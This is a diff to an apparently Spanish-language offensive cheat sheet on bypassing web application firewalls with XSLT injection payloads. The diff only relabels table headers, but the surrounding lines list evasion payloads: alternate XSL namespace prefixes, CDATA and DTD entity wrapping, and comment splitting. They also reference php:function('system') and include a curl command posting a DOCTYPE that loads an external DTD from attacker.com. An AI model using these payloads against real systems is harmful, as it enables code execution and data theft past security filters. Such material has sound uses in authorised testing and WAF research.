@@ -132,7 +132,7 @@ WAF que solo inspecciona el XSL no ve `system` — está en el XML.
 
 ## Namespaces y Prefijos Alternativos
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<x:stylesheet xmlns:x="http://www.w3.org/1999/XSL/Transform"><x:value-of select="'x'"/></x:stylesheet>` | Prefix `x:` en vez de `xsl:` | WAF regex hardcoded `xsl:`. |
 | `<a:stylesheet xmlns:a="http://www.w3.org/1999/XSL/Transform">...</a:stylesheet>` | Prefix `a:` arbitrario | Variación random. |
@@ -166,7 +166,7 @@ WAF no matchea `xsl:` ni `php:function('system'` por separado.
 
 ## CDATA y Entity Wrapping
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<![CDATA[<xsl:value-of select="'x'"/>]]>` | Wrap payload en CDATA | WAFs que no descienden a CDATA. |
 | `<!DOCTYPE r [<!ENTITY p "<xsl:value-of select='7*7'/>">]><r>&p;</r>` | Entity con payload, expandida en body | DTD-based expansion. |
@@ -195,7 +195,7 @@ curl -X POST --data '<!DOCTYPE r SYSTEM "http://attacker.com/p.dtd"><r>&p;</r>' 
 
 ## Comentarios y Whitespace
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<!--x--><xsl:value-of select="'x'"/>` | Comment antes del tag | Rompe WAF regex multiline anchored. |
 | `<xsl:template match="/"><!--x--><xsl:value-of select="'x'"/></xsl:template>` | Comment dentro de template | Fragmenta secuencia. |
